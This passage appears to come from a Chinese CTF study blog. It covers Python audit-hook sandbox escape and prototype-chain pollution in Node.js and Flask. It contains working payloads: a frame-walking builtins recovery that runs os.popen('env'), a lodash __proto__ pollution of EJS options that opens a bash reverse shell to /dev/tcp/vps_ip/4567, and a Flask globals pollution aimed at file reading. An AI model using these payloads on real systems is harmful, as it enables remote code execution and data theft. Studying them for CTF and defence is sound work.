class="built_in">len</span>(args) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception</span><br><span class="line">addaudithook(my_audit_checker)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们先闭合print来实现任意代码执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;)</span><br><span class="line">print(0)</span><br><span class="line">(&quot;</span><br></pre></td></tr></table></figure><p>然后通过修改内部<code>__builtins__</code>解除内部限制：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: event == x, allowed_events)):</span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>解法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;list&#x27;</span>] = <span class="keyword">lambda</span> x: <span class="literal">True</span></span><br><span class="line">__builtins__[<span class="string">&#x27;len&#x27;</span>] = <span class="keyword">lambda</span> x: <span class="number">0</span></span><br></pre></td></tr></table></figure><p>再利用生成器获取帧对象，然后一直获取上方的帧即可还原出外部的builtins</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">global</span> x, frame</span><br><span class="line">    frame = x.gi_frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="keyword">yield</span></span><br><span class="line">x = f()</span><br><span class="line">x.send(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(frame[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env&#x27;</span>).read())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染(js/python)</title>
      <link href="/2025/12/29/pollution/"/>
      <url>/2025/12/29/pollution/</url>
      
        <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h3 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h3><p>和类和对象的继承关系很像<br>对比起来理解就很容易了:</p><h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h3><p><a href="https://blog.csdn.net/qq_51586883/article/details/119867720">https://blog.csdn.net/qq_51586883/article/details/119867720</a><br>例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;liahuqiu&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">test</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">23333</span>;</span><br><span class="line">​</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span>=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="title function_">test</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><p>假设有merge函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么利用js的特性:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> b=&#123;<span class="attr">n</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(a,b);</span><br><span class="line"><span class="comment">//b复制给a</span></span><br></pre></td></tr></table></figure><p>JSON.parse的时候这个时候__proto__就会被当做键名<br>不使用parse则__proto__解析为原型</p><h3 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h3><p><a href="https://blog.csdn.net/qq_34942239/article/details/136431085">https://blog.csdn.net/qq_34942239/article/details/136431085</a><br>查看源码发现提示查看&#x2F;source接口<br>那么后端使用的应该是node.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="title function_">express</span>()</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line">.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password, token&#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">data</span> = &#123;</span><br><span class="line">                <span class="attr">username</span>: username,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">if</span> (!username || username == <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&quot;Username existed.&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret);</span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&quot;Token: &quot;</span> + token&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">        <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="literal">null</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">post</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> !== <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">            <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;U cant change uid&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">data</span> = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">outputFunctionName</span>);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">listen</span>(<span class="number">827</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;client&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps_ip/4567 0&gt;&amp;1\&quot;&#x27;);&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>对于python来说就没有原型的概念了<br>事实上就是父类与子类的继承关系<br>也就是说子类继承的变量相当于父类的一个引用<br>所以如果改变父类的属性那么子类也会跟着改变<br><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7KD=GCYDkt2ZDFmmD">https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7KD%3DGCYDkt2ZDFmmD</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>污染过程:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><p>全局变量的位置:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(demo.__globals__==<span class="built_in">globals</span>()==A.__init__.__globals__)</span><br></pre></td></tr></table></figure><h3 id="针对flask的原型链污染"><a href="#针对flask的原型链污染" class="headerlink" title="针对flask的原型链污染"></a>针对flask的原型链污染</h3><h5 id="2025-0xgame-Lemon-RevEnge"><a href="#2025-0xgame-Lemon-RevEnge" class="headerlink" title="2025_0xgame_Lemon_RevEnge"></a>2025_0xgame_Lemon_RevEnge</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Game0x = Dst()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(Game0x.__init__.__globals__[<span class="string">&quot;app&quot;</span>].__dict__)</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), Game0x)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, Game0x=Game0x)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p>没有能够专门用来污染的目标点</p><p>那么就是针对flask的一些属性进行污染</p><p>因为json没有办法承载对象，所以我们是没法打内存马的，lambda表达式渲染不出来</p><p>首先通过进入点的全局作用域来获得app</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在app的<code>__dict__</code>中获得所有的可写属性，可以打出来看一下有哪些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;import_name&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_static_folder&#x27;</span>: <span class="string">&#x27;static&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_static_url_path&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">    <span class="string">&#x27;template_folder&#x27;</span>: <span class="string">&#x27;templates&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;root_path&#x27;</span>: <span class="string">&#x27;c:\\Users\\20889\\Downloads\\app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;view_functions&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;static&#x27;</span>: <span class="string">&#x27;&lt;function object&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index&#x27;</span>: <span class="string">&#x27;&lt;function index object&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;render_page&#x27;</span>: <span class="string">&#x27;&lt;function render_page object&gt;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;error_handler_spec&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;before_request_funcs&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;after_request_funcs&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;teardown_request_funcs&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;template_context_processors&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;url_value_preprocessors&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;url_default_functions&#x27;</span>: <span class="string">&#x27;&lt;defaultdict object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;instance_path&#x27;</span>: <span class="string">&#x27;C:\\Users\\20889\\Downloads\\app\\instance&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;config&#x27;</span>: <span class="string">&#x27;&lt;Config object&gt;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;aborter&#x27;</span>: <span class="string">&#x27;&lt;werkzeug.exceptions.Aborter object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>: <span class="string">&#x27;&lt;flask.json.provider.DefaultJSONProvider object&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;url_build_error_handlers&#x27;</span>: [],</span><br><span class="line">    <span class="string">&#x27;teardown_appcontext_funcs&#x27;</span>: [],</span><br><span class="line">    <span class="string">&#x27;shell_context_processors&#x27;</span>: [],</span><br><span class="line">    <span class="string">&#x27;blueprints&#x27;</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">&#x27;extensions&#x27;</span>: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;url_map&#x27;</span>: <span class="string">&#x27;Map object: [static, index, render_page]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;subdomain_matching&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&#x27;_got_first_request&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&#x27;cli&#x27;</span>: <span class="string">&#x27;&lt;AppGroup app&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;app&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对这三项进行污染可以做到读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;_static_folder&#x27;: &#x27;static&#x27;,</span><br><span class="line">&#x27;_static_url_path&#x27;: None,</span><br><span class="line">&#x27;template_folder&#x27;: &#x27;templates&#x27;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span 